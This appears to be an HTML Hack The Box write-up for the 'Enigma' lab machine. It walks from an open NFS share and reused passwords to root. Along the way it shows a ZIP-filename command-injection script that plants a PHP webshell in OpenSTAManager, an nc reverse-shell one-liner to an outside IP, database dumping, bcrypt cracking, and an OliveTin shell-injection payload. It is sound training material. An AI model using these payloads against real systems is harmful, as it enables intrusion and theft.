@@ -1,0 +1,228 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>HTB Enigma — Full Walkthrough</title>
+    <link href="https://fonts.googleapis.com/css2?family=IBM+Plex+Mono:wght@400;500;600&family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">
+    <style>:root{--bg:#0c0e12;--surface:#13161c;--surface-raised:#1a1e26;--border:#262b36;--text:#c8cdd6;--text-muted:#6b7280;--heading:#e8ecf2;--accent:#4ade80;--accent-dim:#166534;--red:#f87171;--amber:#fbbf24;--blue:#60a5fa;--purple:#c084fc;--cyan:#22d3ee;--code-bg:#0a0c10}*{margin:0;padding:0;box-sizing:border-box}body{font-family:'Inter',-apple-system,sans-serif;background:var(--bg);color:var(--text);line-height:1.7;-webkit-font-smoothing:antialiased}.hero{border-bottom:1px solid var(--border);padding:4rem 2rem 3rem;position:relative}.hero::before{content:'';position:absolute;top:0;left:0;right:0;height:2px;background:linear-gradient(90deg,var(--accent),var(--blue),var(--red))}.hero-inner{max-width:860px;margin:0 auto}.hero-label{font-family:'IBM Plex Mono',monospace;font-size:.75rem;letter-spacing:.12em;text-transform:uppercase;color:var(--accent);margin-bottom:1rem}.hero h1{font-size:2.8rem;font-weight:700;color:var(--heading);letter-spacing:-.03em}.hero h1 span{color:var(--accent)}.hero-meta{margin-top:1.2rem;display:flex;gap:2rem;flex-wrap:wrap;font-family:'IBM Plex Mono',monospace;font-size:.8rem;color:var(--text-muted)}.hero-meta strong{color:var(--text)}.chain{background:var(--surface);border-bottom:1px solid var(--border);padding:1.5rem 2rem;overflow-x:auto}.chain-inner{max-width:860px;margin:0 auto;display:flex;align-items:center;gap:0;white-space:nowrap;font-family:'IBM Plex Mono',monospace;font-size:.78rem}.chain-node{padding:.4rem .9rem;border-radius:4px;font-weight:500}.chain-node.green{background:var(--accent-dim);color:var(--accent)}.chain-node.blue{background:#1e3a5f;color:var(--blue)}.chain-node.red{background:#5f1e1e;color:var(--red)}.chain-arrow{color:var(--text-muted);padding:0 .5rem}.content{max-width:860px;margin:0 auto;padding:3rem 2rem 6rem}.phase{margin-top:3.5rem;margin-bottom:2rem;padding-bottom:.8rem;border-bottom:1px solid var(--border)}.phase:first-child{margin-top:0}.phase-number{font-family:'IBM Plex Mono',monospace;font-size:.7rem;letter-spacing:.15em;text-transform:uppercase;margin-bottom:.3rem}.phase-number.green{color:var(--accent)}.phase-number.blue{color:var(--blue)}.phase-number.red{color:var(--red)}.phase h2{font-size:1.6rem;font-weight:700;color:var(--heading)}h3{font-size:1.15rem;font-weight:600;color:var(--heading);margin-top:2.2rem;margin-bottom:.8rem}p{margin-bottom:1rem}pre{background:var(--code-bg);border:1px solid var(--border);border-radius:6px;padding:1.2rem 1.4rem;overflow-x:auto;margin:1rem 0 1.4rem;font-family:'IBM Plex Mono',monospace;font-size:.82rem;line-height:1.65;color:var(--text)}pre .comment{color:var(--text-muted)}pre .cmd{color:var(--accent)}pre .output{color:#8b949e}pre .highlight{color:var(--amber)}pre .important{color:var(--red)}code{font-family:'IBM Plex Mono',monospace;font-size:.88em;background:var(--surface-raised);padding:.15em .4em;border-radius:3px;color:var(--cyan)}pre code{background:none;padding:0;color:inherit}.callout{border-radius:6px;padding:1rem 1.2rem;margin:1.2rem 0;font-size:.92rem;line-height:1.6}.callout-why{background:#1a1e26;border-left:3px solid var(--blue)}.callout-why .callout-label{color:var(--blue)}.callout-key{background:#1a1220;border-left:3px solid var(--purple)}.callout-key .callout-label{color:var(--purple)}.callout-warn{background:#1e1a12;border-left:3px solid var(--amber)}.callout-warn .callout-label{color:var(--amber)}.callout-label{font-family:'IBM Plex Mono',monospace;font-size:.72rem;font-weight:600;letter-spacing:.1em;text-transform:uppercase;display:block;margin-bottom:.3rem}.takeaway{background:var(--surface);border:1px solid var(--border);border-radius:6px;padding:1.5rem;margin:2rem 0}.takeaway h3{margin-top:0}.takeaway-item{padding:.5rem 0;border-bottom:1px solid var(--border)}.takeaway-item:last-child{border-bottom:none}.takeaway-item strong{color:var(--heading)}.takeaway-item p{margin-bottom:0}.diagram{background:var(--surface);border:1px solid var(--border);border-radius:6px;padding:2rem;margin:1.5rem 0;text-align:center;font-family:'IBM Plex Mono',monospace;font-size:.82rem;line-height:2;color:var(--text);overflow-x:auto}.diagram .node{display:inline-block;padding:.3rem .8rem;border-radius:4px}.diagram .node-green{background:var(--accent-dim);color:var(--accent)}.diagram .node-blue{background:#1e3a5f;color:var(--blue)}.diagram .node-red{background:#5f1e1e;color:var(--red)}.diagram .arrow{color:var(--text-muted);margin:0 .3rem}.footer{text-align:center;padding:2rem;font-family:'IBM Plex Mono',monospace;font-size:.75rem;color:var(--text-muted);border-top:1px solid var(--border);margin-top:4rem}@media(max-width:640px){.hero h1{font-size:1.8rem}.content{padding:2rem 1rem 4rem}pre{font-size:.75rem;padding:1rem}}</style>
+</head>
+<body>
+<div id="gate" style="position:fixed;inset:0;z-index:9999;background:var(--bg);display:flex;align-items:center;justify-content:center;"><div style="text-align:center;font-family:'IBM Plex Mono',monospace;"><div style="font-size:2.4rem;margin-bottom:.3rem;">🔐</div><div style="font-size:.72rem;letter-spacing:.12em;text-transform:uppercase;color:var(--accent);margin-bottom:1.2rem;">HTB Writeup — Restricted</div><div style="color:var(--text-muted);font-size:.85rem;margin-bottom:1.5rem;max-width:320px;line-height:1.6;">This writeup contains spoilers for an HTB machine.<br>Enter the password to continue.</div><input id="gate-pw" type="password" placeholder="Password" autofocus style="background:var(--surface);border:1px solid var(--border);color:var(--heading);padding:.6rem 1rem;border-radius:4px;font-family:inherit;font-size:.9rem;width:220px;text-align:center;outline:none;" onkeydown="if(event.key==='Enter')checkPw()"><br><button onclick="checkPw()" style="margin-top:.8rem;background:var(--accent-dim);color:var(--accent);border:1px solid var(--accent);padding:.5rem 1.8rem;border-radius:4px;font-family:inherit;font-size:.82rem;cursor:pointer;">Enter</button><div id="gate-err" style="color:var(--red);font-size:.78rem;margin-top:.8rem;visibility:hidden;">Incorrect password</div><div style="color:var(--text-muted);font-size:.7rem;margin-top:2rem;opacity:.4;font-style:italic;direction:rtl;unicode-bidi:bidi-override;">Tessera est nomen machinae</div></div></div>
+<script>function checkPw(){if(document.getElementById('gate-pw').value==='enigma'){document.getElementById('gate').style.display='none';sessionStorage.setItem('htb-auth-enigma','1')}else{document.getElementById('gate-err').style.visibility='visible';document.getElementById('gate-pw').value=''}}if(sessionStorage.getItem('htb-auth-enigma')==='1')document.getElementById('gate').style.display='none';</script>
+
+<header class="hero"><div class="hero-inner"><div class="hero-label">Hack The Box — Walkthrough</div><h1><span>Enigma</span></h1><div class="hero-meta"><span>OS <strong>Linux</strong></span><span>Difficulty <strong>Medium</strong></span><span>Ports <strong>22 · 80 · 110 · 143 · 2049</strong></span><span>Author <strong><a href="https://app.hackthebox.com/" style="color:var(--accent);text-decoration:none;">Nauhcnes</a></strong></span></div></div></header>
+
+<div class="chain"><div class="chain-inner"><span class="chain-node green">NFS cred leak → mail → OpenSTAManager RCE</span><span class="chain-arrow">→</span><span class="chain-node blue">DB dump → bcrypt crack → SSH haris</span><span class="chain-arrow">→</span><span class="chain-node red">OliveTin CVE-2026-27626 → root</span></div></div>
+
+<main class="content">
+
+<div class="phase"><div class="phase-number green">Phase 0</div><h2>Reconnaissance</h2></div>
+
+<h3>Nmap</h3>
+<pre><code><span class="cmd">$ sudo nmap -sCV -p- -T4 10.129.22.194</span>
+<span class="output">PORT      STATE SERVICE  VERSION
+22/tcp    open  ssh      OpenSSH 9.6p1 Ubuntu
+80/tcp    open  http     nginx 1.24.0 (Ubuntu)
+|_http-title: Enigma Corp — Managed IT Solutions
+110/tcp   open  pop3     Dovecot pop3d
+143/tcp   open  imap     Dovecot imapd
+993/tcp   open  ssl/imap Dovecot imapd
+995/tcp   open  ssl/pop3 Dovecot pop3d
+<span class="highlight">2049/tcp  open  nfs_acl</span>  3 (RPC #100227)
+111/tcp   open  rpcbind  2-4 (RPC #100000)</span></code></pre>
+
+<p>A typical corporate IT server — full Dovecot mail stack (POP3/IMAP) plus <strong>NFS (2049)</strong>. NFS is often the first information disclosure to check.</p>
+
+<pre><code><span class="cmd">$ echo "10.129.22.194 enigma.htb" | sudo tee -a /etc/hosts</span></code></pre>
+
+
+<div class="phase"><div class="phase-number green">Phase 1</div><h2>NFS Information Leak → Mail Chain → OpenSTAManager RCE</h2></div>
+
+<h3>NFS Anonymous Share</h3>
+<pre><code><span class="cmd">$ showmount -e 10.129.22.194</span>
+<span class="output">Export list for 10.129.22.194:
+<span class="highlight">/srv/nfs/onboarding *</span></span>
+
+<span class="comment"># * = open to everyone, mount directly</span>
+<span class="cmd">$ mkdir /tmp/nfs_share
+$ sudo mount -t nfs 10.129.22.194:/srv/nfs/onboarding /tmp/nfs_share -o nolock
+$ ls /tmp/nfs_share</span>
+<span class="output">New_Employee_Access.pdf</span>
+
+<span class="cmd">$ cp /tmp/nfs_share/New_Employee_Access.pdf .</span></code></pre>
+
+<p>The PDF contains new employee onboarding credentials:</p>
+<pre><code><span class="output">IT Department - New Employee System Access
+Employee: Kevin Mitchell
+Webmail URL: http://mail001.enigma.htb
+<span class="highlight">Username: kevin
+Password: Enigma2024!</span></span></code></pre>
+
+<h3>POP3 Mail Enumeration — kevin → sarah</h3>
+<pre><code><span class="cmd">$ openssl s_client -connect 10.129.22.194:995 -quiet</span>
+<span class="output">+OK Dovecot (Ubuntu) ready.</span>
+<span class="cmd">USER kevin</span>
+<span class="output">+OK</span>
+<span class="cmd">PASS Enigma2024!</span>
+<span class="output">+OK Logged in.</span>
+<span class="cmd">LIST</span>
+<span class="output">+OK 1 messages:
+1 1473</span>
+<span class="cmd">RETR 1</span>
+<span class="output">From: sarah@enigma.htb
+Subject: Welcome to Enigma Corp, Kevin!
+...
+I'm Sarah from the Accounts department...</span></code></pre>
+
+<h3>Password Reuse → sarah's Mail Leaks OpenSTAManager</h3>
+<pre><code><span class="comment"># Password reuse: kevin's password works for sarah</span>
+<span class="cmd">USER sarah</span>
+<span class="cmd">PASS Enigma2024!</span>
+<span class="output">+OK Logged in.</span></code></pre>
+
+<p>sarah's inbox has an IT email with OpenSTAManager backend credentials:</p>
+<pre><code><span class="output">From: it@enigma.htb
+Subject: Re: OpenSTAManager Access Request
+
+URL: http://support_001.enigma.htb
+<span class="highlight">Username: admin
+Password: Ne3s4rtars78s</span>
+
+Personal Token: <span class="highlight">9ypNtDz1PgUPvXku9psL5wfr8pswjB67</span>
+API URL: http://support_001.enigma.htb/api/?token=9ypNtDz1PgUPvXku9psL5wfr8pswjB67</span></code></pre>
+
+<pre><code><span class="cmd">$ echo "10.129.22.194 support_001.enigma.htb mail001.enigma.htb" | sudo tee -a /etc/hosts</span></code></pre>
+
+<p>Login confirms version: <strong>OpenSTAManager 2.9.8</strong>.</p>
+
+<div class="callout callout-warn">
+<span class="callout-label">Dead end: Roundcube SQLi</span>
+The mail system runs Roundcube. CVE-2026-48842 (<code>_user</code> parameter SQL injection) looks tempting but returns 401 — the parameter is not injectable here. The real vulnerability is in OpenSTAManager, not the mail system. Don't waste time on dead ends.
+</div>
+
+<h3>OpenSTAManager Filename Command Injection</h3>
+<p>The electronic invoice import module (<code>id_module=14</code>) processes uploaded ZIP files. It passes the <strong>filename inside the ZIP</strong> directly to a shell command for <code>.p7m</code> decryption — without escaping. This allows command injection via the filename.</p>
+
+<pre><code><span class="comment"># Generate malicious ZIP — webshell hidden in filename</span>
+<span class="cmd">python3 - &lt;&lt; 'EOF'
+import zipfile
+
+# Command: cd into files directory, write a PHP webshell
+cmd = "cd files && echo '<?php system($_GET[\"c\"]); ?>' > SHELL.php"
+
+# Inject into filename: close quotes, inject command, restore .p7m extension
+filename = f'invoice.p7m";{cmd};echo ".p7m'
+
+with zipfile.ZipFile('exploit.zip', 'w') as zf:
+    zf.writestr(filename, b"DUMMY_P7M_CONTENT")
+EOF</span></code></pre>
+
+<p>Upload <code>exploit.zip</code> via the import page at <code>http://support_001.enigma.htb/controller.php?id_module=14#tab_48</code>.</p>
+
+<h3>Verify Webshell → Reverse Shell</h3>
+<pre><code><span class="cmd">$ curl "http://support_001.enigma.htb/files/SHELL.php?c=id"</span>
+<span class="output">uid=33(www-data) gid=33(www-data) groups=33(www-data)</span>
+
+<span class="cmd">$ curl "http://support_001.enigma.htb/files/SHELL.php?c=ls+/home"</span>
+<span class="output">haris
+it
+kevin
+sarah</span>
+
+<span class="comment"># Reverse shell (mkfifo version for reliability)</span>
+<span class="cmd">$ curl "http://support_001.enigma.htb/files/SHELL.php?c=rm+/tmp/f;mkfifo+/tmp/f;cat+/tmp/f|sh+-i+2>%261|nc+10.10.14.15+4444+>/tmp/f"</span>
+
+<span class="comment"># Listener:</span>
+<span class="cmd">$ nc -lvnp 4444</span>
+<span class="output">www-data@enigma:~$</span></code></pre>
+
+
+<div class="phase"><div class="phase-number blue">Phase 2</div><h2>Lateral Movement — Database Dump → SSH haris</h2></div>
+
+<h3>Database Credentials from Config</h3>
+<pre><code><span class="cmd">www-data@enigma:~$ cat /var/www/html/openstamanager/config.inc.php</span>
+<span class="output">$db_host = 'localhost';
+$db_username = '<span class="highlight">brollin</span>';
+$db_password = '<span class="highlight">Fri3nds@9099</span>';
+$db_name = 'openstamanager';</span></code></pre>
+
+<h3>Dump User Table</h3>
+<pre><code><span class="cmd">www-data@enigma:~$ mysql -u brollin -p'Fri3nds@9099' openstamanager \
+    -e "SELECT username,password FROM zz_users;"</span>
+<span class="output">+----------+--------------------------------------------------------------+
+| username | password                                                     |
++----------+--------------------------------------------------------------+
+| admin    | $2y$10$rTJVUNyGGKPlhw2cFdf5AeDHVMhnIChddcHx2XxVLMQS2KsuSz4Pu |
+| haris    | <span class="highlight">$2y$10$WHf1T79sxjsZongUKT2jGeexTkvihBQyCZeoYXmObiNphrsZDr6eC</span> |
++----------+--------------------------------------------------------------+</span></code></pre>
+
+<h3>Crack haris bcrypt Hash</h3>
+<pre><code><span class="cmd">$ echo '$2y$10$WHf1T79sxjsZongUKT2jGeexTkvihBQyCZeoYXmObiNphrsZDr6eC' > hash.txt
+$ hashcat -m 3200 hash.txt /usr/share/wordlists/rockyou.txt</span>
+<span class="output">$2y$10$WHf1T79sxjsZongUKT2jGeexTkvihBQyCZeoYXmObiNphrsZDr6eC:<span class="highlight">bestfriends</span></span></code></pre>
+
+<h3>SSH → User Flag</h3>
+<pre><code><span class="cmd">$ ssh haris@10.129.22.194</span>
+<span class="output">Password: bestfriends</span>
+
+<span class="cmd">haris@enigma:~$ cat user.txt</span>
+<span class="output">923d2fc9a1e4eecb53c0b17b2e431c70</span></code></pre>
+
+
+<div class="phase"><div class="phase-number red">Phase 3</div><h2>Privilege Escalation — OliveTin Command Injection (CVE-2026-27626)</h2></div>
+
+<h3>Internal Service Discovery</h3>
+<pre><code><span class="cmd">haris@enigma:~$ ss -tlnp</span>
+<span class="output">LISTEN  127.0.0.1:3306    ← MySQL
+LISTEN  127.0.0.1:<span class="highlight">1337</span>    ← OliveTin
+LISTEN  127.0.0.1:25      ← postfix</span>
+
+<span class="cmd">haris@enigma:~$ /usr/local/bin/OliveTin --version</span>
+<span class="output">version="3000.10.0"  commit="d22bdeb"</span></code></pre>
+
+<div class="callout callout-why">
+<span class="callout-label">What is OliveTin?</span>
+OliveTin is a web panel that wraps predefined shell commands into clickable buttons. Admins use it to give non-technical users one-click access to tasks like database backups or service restarts. Version 3000.10.0 is vulnerable to <strong>CVE-2026-27626</strong>: the <code>password</code> parameter type doesn't filter shell metacharacters, enabling command injection. Critically, OliveTin runs as <strong>root</strong>.
+</div>
+
+<h3>Port Forward</h3>
+<pre><code><span class="cmd">$ ssh -L 1337:127.0.0.1:1337 haris@10.129.22.194</span></code></pre>
+
+<p>Access <code>http://127.0.0.1:1337</code> in the browser. Find the <strong>backup_database</strong> action.</p>
+
+<h3>Command Injection via db_pass Parameter</h3>
+<p>The action's underlying command is:</p>
+<pre><code><span class="output">mysqldump -u {{ db_user }} -p'{{ db_pass }}' {{ db_name }} > /opt/backups/backup.sql</span></code></pre>
+
+<p>In the <code>db_pass</code> field, enter:</p>
+<pre><code><span class="highlight">x' ; cat /root/root.txt ; #</span></code></pre>
+
+<p>This results in:</p>
+<pre><code><span class="output">mysqldump -u backup_svc -p'<span class="important">x' ; cat /root/root.txt ; #</span>' production > /opt/backups/backup.sql</span></code></pre>
+
+<div class="callout callout-key">
+<span class="callout-label">Injection breakdown</span>
+<code>x'</code> closes the <code>-p'</code> single quote. <code>;</code> is a command separator. <code>cat /root/root.txt</code> executes as root (OliveTin's UID). <code>; #</code> comments out the remaining original command. CVE-2026-27626's core flaw: <code>password</code> type parameters skip shell metacharacter filtering, while other types like <code>ascii_identifier</code> are properly sanitized.
+</div>
+
+<h3>Root Flag</h3>
+<p>Click execute. OliveTin's output displays:</p>
+<pre><code><span class="output"><span class="highlight">12bf7f217845e2f40dd07f341e7d965f</span></span></code></pre>
+
+
+<div class="phase"><div class="phase-number" style="color:var(--purple);">Appendix</div><h2>Key Takeaways</h2></div>
+
+<div class="takeaway">
+<div class="takeaway-item"><strong>NFS anonymous shares leak credentials.</strong><p><code>/srv/nfs/onboarding *</code> was open to the world and contained plaintext passwords in a PDF. Always check <code>showmount -e</code> during recon.</p></div>
+<div class="takeaway-item"><strong>Password reuse chains through multiple accounts.</strong><p><code>Enigma2024!</code> worked for both kevin and sarah. Each compromised mailbox revealed credentials for the next service.</p></div>
+<div class="takeaway-item"><strong>Filenames in archives are injection vectors.</strong><p>OpenSTAManager passed ZIP entry filenames to shell commands without escaping. Any application that processes filenames in shell context is vulnerable.</p></div>
+<div class="takeaway-item"><strong>Always dump the database after getting a web shell.</strong><p>The <code>zz_users</code> table contained haris's bcrypt hash, crackable with rockyou. Config files (<code>config.inc.php</code>) provide the database credentials.</p></div>
+<div class="takeaway-item"><strong>OliveTin running as root is a critical misconfiguration.</strong><p>CVE-2026-27626 allows command injection through password-type parameters. Web panels that execute shell commands should never run as root.</p></div>
+</div>
+
+<div class="diagram"><span class="node node-green">NFS PDF</span><span class="arrow">→</span><span class="node node-green">kevin mail</span><span class="arrow">→</span><span class="node node-green">sarah mail</span><span class="arrow">→</span><span class="node node-green">OpenSTAManager RCE</span><span class="arrow">→</span><span class="node node-blue">DB dump → SSH haris</span><span class="arrow">→</span><span class="node node-red">OliveTin CVE → root</span></div>
+
+</main>
+<footer class="footer"><a href="https://app.hackthebox.com/" style="color:var(--accent);text-decoration:none;">Nauhcnes</a> · HTB Enigma Writeup · 2026</footer>
+</body></html>
